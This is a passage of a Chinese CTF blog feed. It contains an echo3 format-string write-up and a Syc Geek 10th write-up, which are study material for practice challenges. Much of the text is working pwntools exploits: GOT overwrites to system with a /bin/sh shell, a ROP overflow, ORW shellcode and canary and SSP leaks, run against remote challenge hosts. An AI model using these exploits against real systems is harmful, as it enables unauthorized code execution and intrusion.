class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19日凌晨针对echo3的新更新"><a href="#3月19日凌晨针对echo3的新更新" class="headerlink" title="3月19日凌晨针对echo3的新更新"></a>3月19日凌晨针对echo3的新更新</h1><p>请教了一下大佬，关于之前为什么我没法指定题目给的libc来运行echo3，原来我姿势不对。</p><p>这里贴一下陈大佬的看雪文章<a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p>里面介绍了如何利用<code>patchelf</code>这个工具来更换程序libc。</p><p>主要命令就是两条，以这道题目的<code>echo3</code>和<code>libc-2.23.so.i386</code>为例来说，我们还需要一个<code>ld-2.23.so</code></p><p><strong>！！！注意这个ld-2.23.so不能直接在/lib/i386-linux-gnu/ld-2.23.so取，这个会一直报段错误。。。被这个困扰了好长时间！多亏陈大佬提醒要去glibc all in one 里下载</strong></p><p>然后我们通过patchelf来更换程序的libc</p><p><code>patchelf --set-interpreter ./ld-2.23.so ./echo3</code></p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.23.so.i386 ./echo3</code></p><p>第一条指令是用来修改ld的，第二条指令是用来修改libc的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319013451.png" alt></p><p>改完以后是这样的。</p><p><strong>本地又调了调，调好本地能打通了，但这在BUU上依旧没法打通，不过在hackme.inndy.tw上面打得通</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319020512.png" alt></p><p><strong>只能说BUU上面的libc有些。。奇葩吧,拿不拿得到flag其实也就那样了,关键是通过这道题目学了好多东西,这要比拿再多的flag都要有意义。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png" alt></p><p>和之前的exp相比，就改了一下改printf_got为system的顺序，因为换了libc以后，system的前两个字节要大于后两个字节。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7720</span>)    </span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',27252)</span></span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so.i386'</span>)</span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19号下午针对echo3的新更新……"><a href="#3月19号下午针对echo3的新更新……" class="headerlink" title="3月19号下午针对echo3的新更新……"></a>3月19号下午针对echo3的新更新……</h1><p>晚上做梦梦到好像有人告诉我这道题应该用LibcSearcher来弄libc…试了一下…果然可以!</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25796</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line">libcbase = libc_start_main - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.symbols['__libc_start_main']</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="comment">#system = libcbase + libc.symbols['system']</span></span><br><span class="line">system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319175220.png" alt></p><p>libc选的这个</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/ZHijack/p/8687182.html" target="_blank" rel="noopener">博客园</a></p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">传送门</a></p><p><a href="https://xz.aliyun.com/t/3700#toc-7" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">Freebuf</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.jianshu.com/p/76152d477322" target="_blank" rel="noopener">简书</a></p><p><a href="https://www.lyyl.online/2019/10/24/HackMe%E4%B8%AD%E7%9A%84echo3/" target="_blank" rel="noopener">传送门</a></p><p><a href="https://carlstar.club/2019/01/02/echo3/#idea" target="_blank" rel="noopener">传送门</a></p><hr><p>和指定libc有关的参考链接</p><p><a href="https://blog.csdn.net/think_ycx/article/details/78005083" target="_blank" rel="noopener">CSDN</a></p><p><a href="http://www.jx-zhang.xyz/2018/01/13/fmtstr" target="_blank" rel="noopener">传送门</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p><a href="https://github.com/NixOS/patchelf" target="_blank" rel="noopener">patchelf</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/74006495_p0.jpg" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>Syc Geek 10th</title>
    <url>/2019/10/31/Syc-Geek-10th/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71.png" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=450041229&auto=1&height=66"></iframe>---------------------<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>第十届极客大挑战结束了,感谢Syc的师傅们,赛题质量很高!学到了很多东西!</li><li>菜是原罪！</li></ul><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-打比赛前先撸一只猫"><a href="#0x01-打比赛前先撸一只猫" class="headerlink" title="0x01 打比赛前先撸一只猫"></a>0x01 打比赛前先撸一只猫</h2><ul><li>不是web选手,但是基本的get传参之类的还是会的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191031203312.png" alt></p><ul><li><p>查看源码发现了这个假的flag。</p></li><li><p>直接get传参<code>?get=dog</code> 构造成<code>http://118.25.14.40:8110/?cat=dog</code>这种形式即可得到真正的flag。</p></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h2><ul><li>签到,关注公众号即可签到拿flag。</li></ul><h2 id="0x02-我好兴奋啊"><a href="#0x02-我好兴奋啊" class="headerlink" title="0x02 我好兴奋啊"></a>0x02 我好兴奋啊</h2><ul><li>十六进制打开,搜索<code>Syc{</code>就能找到flag。</li></ul><h2 id="0x03-翻过这座山"><a href="#0x03-翻过这座山" class="headerlink" title="0x03 翻过这座山"></a>0x03 翻过这座山</h2><ul><li>在所给链接的github里面,有一个教翻墙的详细教程。而且里面有个注意事项,但是里面是假的flag, 真正的flag通过找这个翻墙项目的回收站(大概可以这么叫吧),里面有个flag.md,真正的flag在里面。</li></ul><h2 id="0x04-散打黑客的压缩包"><a href="#0x04-散打黑客的压缩包" class="headerlink" title="0x04 散打黑客的压缩包"></a>0x04 散打黑客的压缩包</h2><ul><li>两次爆破压缩包即可得到flag。</li></ul><h2 id="0x05-是谁杀了谁"><a href="#0x05-是谁杀了谁" class="headerlink" title="0x05 是谁杀了谁"></a>0x05 是谁杀了谁</h2><ul><li>这道题目我直接dnSpy动态调试拿到flag。</li><li>或者解那个DES(我是没解出来..)</li><li>官方WP如下:</li></ul><blockquote><p>exe的逻辑如下 按钮点第一次 –&gt; 生成一个HP的隐藏文件（注意要在“我的电脑”里面勾选隐藏文件选项）<br>按钮点第二次 –&gt; 往HP文件里面写入flag<br>按钮点第三次 –&gt; 删除HP文件里面的flag<br>按钮点第四次 –&gt; 删除HP文件<br>原本出题的时候打算加壳，防止被逆向。后来想想可以多给一条路，于是没有加壳。所以逆 向选手也可以直接逆向分析。</p></blockquote><h2 id="0x06-嘿-你喜欢吃鲱鱼罐头么"><a href="#0x06-嘿-你喜欢吃鲱鱼罐头么" class="headerlink" title="0x06 嘿,你喜欢吃鲱鱼罐头么?"></a>0x06 嘿,你喜欢吃鲱鱼罐头么?</h2><ul><li><p>破伪加密拿到图片,详细信息里面给了提示<code>它看起来像死鱼一样</code>,图片末尾有一串oids串<code>iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio</code></p></li><li><p>根据提示,这和鲱鱼有关系, 最后了解到有一种编码叫deadfish编码。</p></li><li><p>官方WP提供了解密网站:</p></li></ul><p><a href="https://www.dcode.fr/deadfish-language" target="_blank" rel="noopener">解密网站</a></p><ul><li>自己写解密脚本也不难, O 表示输出(output), s表示平方(square),d表示减(dec),i表示(inc),解密脚本如下:</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">"iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio"</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'i'</span>)&#123;</span><br><span class="line">            sum+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'s'</span>)&#123;</span><br><span class="line">            sum=sum*sum;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'d'</span>)&#123;</span><br><span class="line">            sum-=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'o'</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-我也想成为r1ngs"><a href="#0x07-我也想成为r1ngs" class="headerlink" title="0x07 我也想成为r1ngs"></a>0x07 我也想成为r1ngs</h2><ul><li>hex转ascii以后是flag的立体字。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118201005.png" alt></p><ul><li>真有新意。</li></ul><h2 id="0x08-早点睡"><a href="#0x08-早点睡" class="headerlink" title="0x08 早点睡"></a>0x08 早点睡</h2><ul><li>脑洞太大,官方WP如下:</li></ul><blockquote><p>这题出的太智障了，原本都不打算放的… 首先010查看发现这是个psd文件，先把文件后缀改为psd。 然后用ps或者其他类似软件打开，可以看到有一个隐藏图层。里面有个链接。 访问之后下载到第二部分，利用base64转图片可以得到第二个链接。 访问之后下载到第三部分，利用base64转图片可以得到第三个链接。 访问之后下载到第四部分，利用base64转图片发现转不出来了，观察下数据，发现是一段 base64很有规律的重复，将重复的base64提取出来然后解base64就得到了flag。</p></blockquote><h2 id="0x09-RPG真是太好玩了吧"><a href="#0x09-RPG真是太好玩了吧" class="headerlink" title="0x09 RPG真是太好玩了吧"></a>0x09 RPG真是太好玩了吧</h2><ul><li>我这边一直打不开,也就没法做了。</li><li>官方WP说题目没啥难度,打通关就能拿到flag。而且为了防止CE修改破坏游戏体验,设置了当 任意人物到达30级时会出线变态怪物的设定.但是忘记加异常状态抗性了,很轻松就被打死了, 这算一个非预期吧.。</li></ul><h2 id="0x10-I-wanna-be-a-geek"><a href="#0x10-I-wanna-be-a-geek" class="headerlink" title="0x10 I wanna be a geek"></a>0x10 I wanna be a geek</h2><ul><li>每次修改save文件即可跳关。 flag在背景图上。</li></ul><h2 id="0x11-游戏玩累了-不如来听听歌吧"><a href="#0x11-游戏玩累了-不如来听听歌吧" class="headerlink" title="0x11 游戏玩累了 不如来听听歌吧"></a>0x11 游戏玩累了 不如来听听歌吧</h2><ul><li>做的时候忽略了题目的含义<code>吉良吉影发动了败者食尘！时间开始倒流了!</code>。看了WP知道需要倒放(从后往前分析)。</li><li>倒放后在开头有摩斯编码,解码得到flag。</li></ul><h2 id="0x12-马里奥真是太有趣了"><a href="#0x12-马里奥真是太有趣了" class="headerlink" title="0x12 马里奥真是太有趣了"></a>0x12 马里奥真是太有趣了</h2><ul><li>参考官方WP:</li></ul><blockquote><p>下载下来是个nes后缀的文件，下载nes模拟器打开发现是初代SMB<br>游玩过了一世界库巴后会告诉你flag在8-4。直接金手指跳到8-4，从水关回来就是flag。</p></blockquote><h2 id="0x13-The-final"><a href="#0x13-The-final" class="headerlink" title="0x13 The final"></a>0x13 The final</h2><ul><li>师傅们tql! wp见师傅们给的wp:</li></ul><p><a href="https://github.com/LambGod/Syc-Geek-10th-Misc-The-final" target="_blank" rel="noopener">WP传送门</a></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x01-Find-tools"><a href="#0x01-Find-tools" class="headerlink" title="0x01 Find tools"></a>0x01 Find tools</h2><ul><li>pwntools远程拿到key,base64解码,然后send, 注意要interactive,不然拿不到flag。</li></ul><h2 id="0x02-BabyROP"><a href="#0x02-BabyROP" class="headerlink" title="0x02 BabyROP"></a>0x02 BabyROP</h2><ul><li>简单ROP,但官方WP说有小坑???</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>	*	</span><br><span class="line">p = remote(<span class="string">'pwnto.fun'</span>,<span class="number">10000</span>)</span><br><span class="line">payload	= <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x400618</span>) </span><br><span class="line">p.sendline(payload)	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-Babyshellcode"><a href="#0x03-Babyshellcode" class="headerlink" title="0x03 Babyshellcode"></a>0x03 Babyshellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch: amd64-64-little</span><br><span class="line">RELRO: Full RELRO</span><br><span class="line">Stack: No canary found</span><br><span class="line">NX: NX enabled</span><br><span class="line">PIE: No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5CLiuLian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200520215634462.png" alt="image-20200520215634462"></p><p>开了seccomp，通过seccomp-tools查看可知允许Open read write，所以采用ORW</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./RushB"</span>)</span><br><span class="line"></span><br><span class="line">buf_addr=<span class="number">0x123000</span></span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.amd64.pushstr(<span class="string">'./flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"rsp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"rax"</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">sh.recvuntil(<span class="string">"A simple shellcode for U, have fun!"</span>)</span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.recvuntil(<span class="string">"Why not play CSGO?"</span>)</span><br><span class="line">sh.sendline(<span class="string">'A'</span>*<span class="number">0x38</span>+p64(buf_addr))</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><h2 id="0x04-EasyCanary"><a href="#0x04-EasyCanary" class="headerlink" title="0x04 EasyCanary"></a>0x04 EasyCanary</h2><ul><li>泄露Canary。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = remote('pwnto.fun',10001)</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./canary'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b fun')</span></span><br><span class="line"></span><br><span class="line">systemaddr = <span class="number">0x08048647</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line">c.send(payload)</span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line">s = c.recv()</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+s[<span class="number">21</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>* <span class="number">20</span></span><br><span class="line">payload2 += p32(canary)</span><br><span class="line">payload2 += <span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line">payload2 += p32(systemaddr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-BabyCanary"><a href="#0x05-BabyCanary" class="headerlink" title="0x05 BabyCanary"></a>0x05 BabyCanary</h2><ul><li>SSP Leak</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'pwnto.fun'</span>,<span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">c.recvline()</span><br><span class="line"></span><br><span class="line">bufaddr = c.recvline()[<span class="number">18</span>:]</span><br><span class="line"></span><br><span class="line">addr = int(bufaddr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(addr)*<span class="number">250</span></span><br><span class="line"></span><br><span class="line">c.recvline()</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line"></span><br><span 